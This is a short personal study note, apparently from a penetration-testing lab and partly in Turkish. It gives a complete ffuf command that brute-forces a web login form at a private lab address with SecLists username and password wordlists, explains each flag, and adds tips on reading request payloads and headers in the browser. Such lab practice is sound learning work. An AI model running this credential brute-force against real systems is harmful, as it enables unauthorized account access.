```shell
ffuf -w /home/enver/Desktop/wordlists/SecLists/Usernames/Names/names.txt:W1,/home/enver/Desktop/wordlists/SecLists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.65.162.184/customers/login -fc 200 -o results.txt -of csv
```
- -w: Wordlists for usernames and passwords. W1 for choosen username and W2 for choosen password.
- -x: Request method
- -d: Sent data
- -H: Additional headers
- -u: URL
- -fc: Checks for HTTP status code other than 200
- -fs: Same but filters by size
- -o: Output file
- -of: Output file format
---
## Önemli Taktikler 
![[Pasted image 20260202154304.png]]
![[Pasted image 20260202154321.png]]
- Username Password için network -> Payload
- Headers için network -> Headers -> Request Headers -> Content-Type
- Filtreleme işine dikkat et.